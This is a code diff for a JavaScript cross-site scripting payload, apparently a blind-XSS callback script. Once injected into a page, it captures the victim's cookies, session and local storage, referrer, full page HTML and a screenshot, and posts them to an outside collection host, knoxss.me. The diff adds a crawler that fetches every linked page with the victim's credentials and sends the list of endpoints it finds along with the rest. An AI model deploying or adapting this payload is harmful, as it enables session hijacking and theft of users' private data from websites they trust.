@@ -3,6 +3,45 @@ script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/htm
 document.head.appendChild(script);
 
 let base64image;
+let allEndpoints = new Set(); 
+let visitedEndpoints = new Set(); 
+let collectedEndpoints = []; 
+
+function extractHrefs(html) {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const hrefs = Array.from(doc.querySelectorAll('a'))
+        .map(a => a.href)
+        .filter(href => href.startsWith('http'));
+    return hrefs;
+}
+
+function sendRequest(url) {
+    if (visitedEndpoints.has(url)) {
+        return Promise.resolve();
+    }
+    visitedEndpoints.add(url);
+
+    return fetch(url, {
+        method: 'GET',
+        credentials: 'include' 
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error(`Network response was not ok for ${url}`);
+        }
+        return response.text();
+    })
+    .then(data => {
+        const hrefs = extractHrefs(data);
+        hrefs.forEach(href => allEndpoints.add(href));
+
+        return Promise.all(hrefs.map(sendRequest));
+    })
+    .catch(error => {
+        console.error(`There has been a problem with your fetch operation for ${url}:`, error);
+    });
+}
 
 script.onload = function() {
     html2canvas(document.documentElement).then(canvas => {
@@ -52,20 +91,34 @@ script.onload = function() {
 
         document.body.appendChild(loadingOverlay);
 
-        var msg = 'VULNERABLE URL\n' + '';
-        msg += '\n\nTRIGGER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.URL + '\n\nUSER AGENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + navigator.userAgent;
-        msg += '\n\nREFERRER URL\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.referrer + '\n\nREADABLE COOKIES\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.cookie;
-        msg += '\n\nSESSION STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(localStorage); 
-        msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
-        msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
+        const initialUrl = window.location.href;
+        allEndpoints.add(initialUrl);
 
-        var r = new XMLHttpRequest();
-        var mailer = 'https://knoxss.me/00';
-        r.open('POST', mailer, true);
-        r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
-        console.log('Mission completed!');
+        sendRequest(initialUrl)
+        .then(() => {
+            collectedEndpoints = Array.from(allEndpoints);
+            console.log('All requests completed');
 
-        loadingOverlay.style.display = 'none';
+            var msg = 'VULNERABLE URL\n' + '';
+            msg += '\n\nTRIGGER URL:\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.URL + '\n\nUSER AGENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + navigator.userAgent;
+            msg += '\n\nREFERRER URL\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.referrer + '\n\nREADABLE COOKIES\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.cookie;
+            msg += '\n\nSESSION STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL STORAGE\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + JSON.stringify(localStorage); 
+            msg += '\n\nFULL DOCUMENT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + document.documentElement.innerHTML;
+            msg += '\n\nSCREENSHOT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + base64image;
+            msg += '\n\nENDPOINT\n' + '------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n' + collectedEndpoints.join('\n');
+
+            var r = new XMLHttpRequest();
+            var mailer = 'https://knoxss.me/00';
+            r.open('POST', mailer, true);
+            r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
+            console.log('Mission completed!');
+        })
+        .catch(error => {
+            console.error('Error in processing:', error);
+        })
+        .finally(() => {
+            loadingOverlay.style.display = 'none';
+        });
     });
 };
